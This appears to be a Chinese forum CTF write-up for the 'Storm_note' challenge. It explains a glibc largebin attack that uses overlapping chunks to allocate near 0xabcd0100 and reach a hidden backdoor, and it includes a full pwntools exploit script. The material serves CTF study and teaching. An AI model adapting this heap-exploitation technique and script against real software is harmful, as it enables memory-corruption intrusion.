
![图片描述](https://bbs.kanxue.com/upload/attach/201910/855782_GCQCQG5YGN8YHSV.png)

### 将 `unsortedbin` 分配出去

### 然后 `delete` 1 和 2 的时候会进行 `unlink`

### 再次分配堆块的时候

### 就可以通过 `edit` 堆块 7 控制堆块 2 了

![图片描述](https://bbs.kanxue.com/upload/attach/201910/855782_QQHTPSKZGQYSPHR.png)

### 同理，我们进行同样的操作，控制堆块 4，不过要值得一提的是最后

### 不能分配 `0x30`，要分配 `0x40`，使得两个 `Largebin` 块大小不一样，而且不用分配堆块 5，放在 `unsortedbin` 中因为要使得 `chunk` 分配到 `largebin` 上

### （具体不详述，看了一遍可以写一下看自己会不会这种方法）

![图片描述](https://bbs.kanxue.com/upload/attach/201910/855782_5XAZ2A3VDYHUF7Y.png)

---

### 接下来到利用 `larbin_attack` 的部分了，思路是利用 `largebin_attack` 分配到 `0xabcd0100` 附近，修改这里的值，然后执行 `backdoor`

### 释放堆块 2，再分配执行到 `largebin`

### 源码如下：

```
           else

              {

                  victim->fd_nextsize = fwd;

                  victim->bk_nextsize = fwd->bk_nextsize;

                  fwd->bk_nextsize = victim;

                  victim->bk_nextsize->fd_nextsize=victim;

              }

              bck = fwd->bk;

    mark_bin (av, victim_index);

    victim->bk = bck;

    victim->fd = fwd;

    fwd->bk = victim;

    bck->fd = victim;
```

### 其实都是类似于 `unlink` 的操作，不用想的太麻烦

### `victim` 是 `unsorted_bin` 的 `chunk`

### `fwd` 是 `largebin` 的 `chunk`

### 由于 `0xabcd0100` 附近都是的值都是 0，所以需要在里面写入地址作为 `size`

### 这样就可以分配过去了

### 这时候要构建堆块信息，根据上面源码来构建就可以了，不过自己写的时候有点混乱，看了好多遍源码，对照着写

```python
target_addr = 0xabcd0100

target_chunk = target_addr-0x20

payload = p64(0)+p64(0)+p64(0)+p64(0x4f1)+p64(0)+p64(target_chunk) #*(target->fd)=victim  bypass bck->fd != victim

edit(7,payload)

payload = p64(0)*4

payload += p64(0)+p64(target_chunk+0x8) #target_chunk+8+0x10 = victim,就是说target_chunk->fd_nextsize = victim 

payload += p64(0)+p64(target_chunk-0x18-0x5) #写入size

edit(8,payload)

alloc(0x48)
```

### 构建好堆块后，如图

### `Unsorted_bin chunk`:

![图片描述](https://bbs.kanxue.com/upload/attach/201910/855782_8HPDM28GYYSTUT3.png)

### `Large_Bin chunk`:

![图片描述](https://bbs.kanxue.com/upload/attach/201910/855782_AU5ZS279XX3NZU5.png)

![图片描述](https://bbs.kanxue.com/upload/attach/201910/855782_WUFYK6SN76M2U6M.png)

### 这样就可以实现 `largebin attack` 了

![图片描述](https://bbs.kanxue.com/upload/attach/201910/855782_95V49TJNK4C5GZ8.png)

### 再把 `0xabcd0100` 填充 0 就可以用 `backdoor` 了

![图片描述](https://bbs.kanxue.com/upload/attach/201910/855782_VJ2SG7YBQCNRN3K.png)

### 具体源码

```
from PwnContext import *

s       = lambda data               :ctx.send(str(data))        #in case that data is a int

sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 

st      = lambda delim,data         :ctx.sendthen(str(delim), str(data)) 

sl      = lambda data               :ctx.sendline(str(data)) 

sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))

r       = lambda numb=4096          :ctx.recv(numb)

ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)

irt     = lambda                    :ctx.interactive()



rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)

leak    = lambda address, count=0   :ctx.leak(address, count)



uu32    = lambda data   :u32(data.ljust(4, '\0'))

uu64    = lambda data   :u64(data.ljust(8, '\0'))



debugg = 1

logg = 1



ctx.binary = './Storm_note'

#ctx.remote_libc = './'  # /glibc/2.24/lib/libc-2.24.so

#ctx.debug_remote_libc = False # this is by default



#ctx.symbols = {'sym1':0x1234, 'sym2':0x5678}

# ctx.breakpoints = [0x80489AA,0x8048901,0x8048955]

#ctx.debug()



if debugg:

    rs()

else:

    pass



if logg:

    context.log_level = 'debug'

def choice(number):

    sla("Choice:",str(number))

def alloc(size):

    choice(1)

    sla("size ?",str(size))



def edit(idx,content):

    choice(2)

    sla("Index ?",str(idx))

    sla("Content:",content)



def delete(idx):

    choice(3)

    sla("Index ?",str(idx))



alloc(0x18) #0 0x20

alloc(0x508) #1 0x510

alloc(0x18) #2 0x20



alloc(0x18) #3 0x20

alloc(0x508) #4 0x510

alloc(0x18) #5 0x20



alloc(0x10) #6 defense top chunk

# ctx.debug()

# raw_input()

edit(1,'0'*0x4f0+p64(0x500)) # 0x500->prev_size



delete(1)

edit(0,'a'*0x18) # 1->size = 0x500

# raw_input()

alloc(0x18) #1 0x20 1->0x4e0

alloc(0x4d8) #7 0x4e0 addr(0050)

# ctx.debug()

# raw_input()

delete(1)

delete(2)

# raw_input()

alloc(0x30) 

alloc(0x4e0)

edit(4,'0'*0x4f0+p64(0x500)) # 0x500

delete(4)

edit(3,'a'*0x18) # 1->size = 0x500

# raw_input()

alloc(0x18) #4 0x20 1->0x4e0

alloc(0x4d8) #8 0x4e0 addr(0050)

# ctx.debug()

# raw_input()

delete(4)

delete(5)

# raw_input()

alloc(0x40) #4 unsorted chunk->size 4e0



delete(2)

# ctx.debug()

# raw_input()

alloc(0x4e8) #将chunk放入largebin当中



delete(2) #4f0



target_addr = 0xabcd0100

target_chunk = target_addr-0x20

payload = p64(0)+p64(0)+p64(0)+p64(0x4f1)+p64(0)+p64(target_chunk) #*(target->fd)=victim to bypass bck->fd != victim

edit(7,payload)



payload = p64(0)*4

payload += p64(0)+p64(0x4e1)

payload += p64(0)+p64(target_chunk+0x8) #target_chunk+8+0x10 = victim,就是说target_chunk->fd_nextsize = victim 

payload += p64(0)+p64(target_chunk-0x18-0x5) #写入size

edit(8,payload)

alloc(0x40)

edit(2,p64(0)*8)

choice(666)

sl(p64(0)*6)

irt()
```

#### 如果我这篇看不明白的话，可以去看看这些大佬的文章，题目已经放到附件当中了：

[从两道题剖析Largebin Attack](https://bbs.kanxue.com/elink@0b3K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2X3M7X3g2W2j5Y4g2X3i4K6u0W2j5$3!0E0i4K6u0r3j5i4u0@1K9h3y4D9k6i4y4Q4x3V1k6K6P5i4y4@1k6h3#2Q4x3V1j5J5x3o6V1H3z5e0k6Q4x3X3g2Z5N6r3#2D9)

[西湖论剑storm\_note](https://bbs.kanxue.com/elink@c38K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2W2L8$3&6W2N6#2)9J5k6h3y4F1i4K6u0r3j5i4u0U0K9r3W2$3k6i4y4Q4x3V1j5%4x3o6V1`.)

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于  2019-10-3 21:16

被Vinadiak编辑

，原因：

上传的附件：

- [Storm\_note](javascript:void(0);)

  （13.17kb，58次下载）
